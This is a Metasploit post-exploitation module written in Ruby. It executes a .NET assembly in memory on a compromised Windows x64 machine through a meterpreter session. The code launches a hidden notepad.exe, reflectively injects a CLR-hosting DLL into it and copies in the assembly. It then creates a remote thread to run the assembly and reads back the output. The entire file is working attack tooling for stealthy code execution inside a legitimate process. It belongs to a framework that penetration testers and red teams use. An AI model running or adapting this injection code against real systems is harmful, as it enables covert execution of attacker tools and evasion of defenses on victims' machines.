##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'

class MetasploitModule < Msf::Post
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      'Name'            => 'Execute .net Assembly (x64 only)',
      'Description'     => %q{
        This module execute a .net assembly in memory. Refletctively load the dll 
	that host CLR, than copy in memory the assembly that will be executed
      },
      'License'         => MSF_LICENSE,
      'Author'          => 'b4rtik',
      'Arch'            => [ARCH_X64],
      'Platform'        => 'win',
      'SessionTypes'    => [ 'meterpreter' ],
      'Targets'         => [
          [ 'Windows x64 (<= 10)', { 'Arch' => ARCH_X64 } ]
        ],
      'References'      => [
          ['URL', 'https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter.html']
        ],
      'DefaultTarget'   => 0
    }))
    register_options(
      [
        OptString.new('ASSEMBLY', [ true, 'Assembly file name' ]),
        OptPath.new('ASSEMBLYPATH', [ false, 'Assembly directory' ]),
	    OptString.new('ARGUMENTS', [ false, 'Command line arguments' ]),
        OptInt.new('WAIT', [ false, 'Time in seconds to wait',10 ])
      ], self.class)
  end

  def run

    if datastore['ASSEMBLYPATH'] == "" or datastore['ASSEMBLYPATH'].nil?
        exe_path = ::File.join(Msf::Config.data_directory, 'execute-assembly', datastore['ASSEMBLY'])
    else
        exe_path = ::File.join(datastore['ASSEMBLYPATH'], datastore['ASSEMBLY'])
    end
    exe_path = ::File.expand_path(exe_path)

    assembly_size = File.size(exe_path)
    params_size = datastore['ARGUMENTS'].length

    if assembly_size <= 1024000 and params_size <= 1024

    	print_status('Launching notepad to host CLR...')
    	notepad_process = client.sys.process.execute('notepad.exe', nil, {'Channelized' => true,'Hidden' => true})
    	process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
    	print_good("Process #{process.pid} launched.")

    	print_status("Reflectively injecting the Host DLL into #{process.pid}...")

    	library_path = ::File.join(Msf::Config.data_directory, 'execute-assembly','HostingCLRx64.dll')
    	library_path = ::File.expand_path(library_path)

    	print_status("Injecting Host into #{process.pid}...")
    	exploit_mem, offset = inject_dll_into_process(process, library_path)

    	print_status("Host injected. Copy assembly into #{process.pid}...")
    	assembly_mem = process.memory.allocate(1025024, PAGE_READWRITE)
    
    	params = datastore['ARGUMENTS']
    	params = params + ("\x00" * (1024 - params.length))

    	process.memory.write(assembly_mem, params+File.read(exe_path))

    	print_status('Assembly copied. Executing...')
    	process.thread.create(exploit_mem + offset, assembly_mem)

    	sleep(datastore['WAIT'])
    
    	print_status("Start reading output")
    	output = notepad_process.channel.read
    	output.split("\n").each { |x| print_good(x) }
    	print_status("End output.")
    
    	print_good("Killing process #{process.pid}")
    	process.kill(process.pid) 
    	print_good('Execution finished.')
    else
     	if assembly_size > 1024000
	   print_bad("Assembly max size 1024k actual file size #{assembly_size}")
	end

	if params_size > 1024
	   print_bad("Parameters max lenght 1024 actual parameters length #{params_size}")
	end
    end
  end
end